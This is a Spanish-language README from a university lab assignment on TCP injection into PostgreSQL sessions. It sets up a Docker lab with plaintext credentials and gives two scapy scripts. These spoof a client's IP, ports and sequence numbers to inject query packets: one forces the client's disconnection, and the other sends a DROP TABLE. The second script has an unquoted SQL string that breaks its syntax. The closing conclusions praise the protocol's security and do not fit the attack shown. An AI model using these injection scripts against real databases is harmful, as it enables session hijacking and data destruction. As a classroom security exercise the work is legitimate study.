# PostgreSQL TCP Injection Demo

## Descripción del Proyecto
Este proyecto demuestra cómo realizar inyecciones TCP en conexiones PostgreSQL para ejecutar comandos no autorizados, incluyendo expulsar usuarios y eliminar tablas.

## Contexto Técnico

Se utiliza la librería de python **scapy**

- **Estructura de mensajes**:

- Byte de tipo (ej: `Q`=Query, `R`=Autenticación)

- Longitud (4 bytes)

- Cuerpo con datos (consultas, parámetros)

- **Flujo de comunicación**:

1. Startup Message (inicio de sesión)

2. Autenticación (métodos: SCRAM-SHA-256, TLS, etc.)

3. Parameter Status (configuración)

4. Ejecución de consultas (`Q` → `T`/`D`/`C`)

5. Finalización (`X`)

## Configuración del Entorno

### Requisitos

- 2 máquinas virtuales Ubuntu

- Docker instalado en ambos sistemas

```bash

# Comandos de instalación

sudo apt update

sudo apt install docker.io

sudo systemctl enable docker

sudo systemctl start docker

```

### Servidor PostgreSQL

1. Crear contenedor:

```bash

sudo docker run --name pg-servidor \

-e POSTGRES_USER=carlostarea2 \

-e POSTGRES_PASSWORD=psqlclientel23 \

-e POSTGRES_DB=tarea2_taller \

-p 5432:5432 \

-d postgres

```

2. Verificar conexión:

```bash

sudo docker ps

```

3. Abrir puerto 5432 en el firewall.

### Cliente PostgreSQL

1. Verificar conectividad con el servidor (reemplazar IP según tu entorno):

```bash

ping 172.16.30.83

```

2. Conectar al servidor:

```bash

docker run -it --rm postgres psql \

-h 172.16.30.83 \

-U carlostarea2 \

-d tarea2_taller

```

*Ingresar contraseña cuando se solicite*

## Instalación scapy


```bash

pip install scapy

```
## Expulsar usuario
Este script genera trafico basura dirigido al servidor para forzar la desconexión del cliente
```bash
#expulsar_usuario.py
from scapy.all import *
import struct
import time

# Valores REALES extraídos de Wireshark (ajusta estos)
ip_src = "192.168.1.89"     # IP cliente
ip_dst = "192.168.1.90"     # IP servidor
sport = 54678               # Puerto TCP cliente
dport = 5432                # Puerto PostgreSQL
seq_base = 123456789        # Sequence number capturado
ack = 987654321             # Acknowledgment number capturado

# Lista de cargas PostgreSQL (maliciosas o falsas)
consultas = [
    "SOMEGARBAGE",    # pura basura
    "ABORT;",         # comando SQL que puede cerrar sesión
]

# Enviar cada paquete uno por uno
for i, consulta in enumerate(consultas):
    payload = b'Q' + struct.pack("!I", len(consulta.encode()) + 5) + consulta.encode() + b'\x00'
    ip = IP(src=ip_src, dst=ip_dst)
    tcp = TCP(sport=sport, dport=dport, seq=seq_base, ack=ack, flags="PA")
    pkt = ip / tcp / Raw(load=payload)
    print(f"[{i+1}/{len(consultas)}] Enviando: {consulta}")
    send(pkt, verbose=False)
    seq_base += len(payload)  # avanza el número de secuencia TCP
    time.sleep(0.2)  # pausa corta para no congestionar

print("Inyección completada.")
```
Se ejecuta utilizando
```bash
sudo python3 expulsar_usuario.py
```
## Eliminar tabla
Se simula ser un cliente autentico para enviar el comando de DROP TABLE al servidor y así eliminar la tabla creada por el cliente
```bash
#eliminar_tabla.py
from scapy.all import *
import struct
import time

# Valores REALES extraídos de Wireshark (ajusta estos)
ip_src = "192.168.1.89"     # IP cliente
ip_dst = "192.168.1.90"     # IP servidor
sport = 54678               # Puerto TCP cliente
dport = 5432                # Puerto PostgreSQL
seq_base = 123456789        # Sequence number capturado
ack = 987654321             # Acknowledgment number capturado

# Lista de cargas PostgreSQL (maliciosas o falsas)
consultas = [
    DROP TABLE IF EXISTS claves;
]

# Enviar cada paquete uno por uno
for i, consulta in enumerate(consultas):
    payload = b'Q' + struct.pack("!I", len(consulta.encode()) + 5) + consulta.encode() + b'\x00'
    ip = IP(src=ip_src, dst=ip_dst)
    tcp = TCP(sport=sport, dport=dport, seq=seq_base, ack=ack, flags="PA")
    pkt = ip / tcp / Raw(load=payload)
    print(f"[{i+1}/{len(consultas)}] Enviando: {consulta}")
    send(pkt, verbose=False)
    seq_base += len(payload)  # avanza el número de secuencia TCP
    time.sleep(0.2)  # pausa corta para no congestionar

print("Inyección completada.")
```
Se ejecuta utilizando
```bash
sudo python3 eliminar_tabla.py
```
## Conclusiones

1. El protocolo sigue un flujo estructurado y predecible

2. Comunicación binaria eficiente con bajo overhead

3. Seguridad implementada mediante:

- Autenticación SCRAM-SHA-256

- Soporte para TLS 1.3 (PostgreSQL 13+)

4. Compatibilidad con herramientas estándar (psql, pgAdmin, DBeaver)

5. Ideal para entornos distribuidos y sistemas en la nube

## Recursos Adicionales

- [Documentación Oficial del Protocolo](https://www.postgresql.org/docs/current/protocol.html)

- [Docker Hub - Imagen PostgreSQL](https://hub.docker.com/_/postgres)

- [Wireshark - Wiki](https://wiki.wireshark.org/)

- [Comunidad PostgreSQL](https://www.postgresql.org/community/)

## Autores

- Carlos Rodríguez

- Jorge Gonzalez

- Martín Mora

*Universidad Diego Portales - Junio 2025*
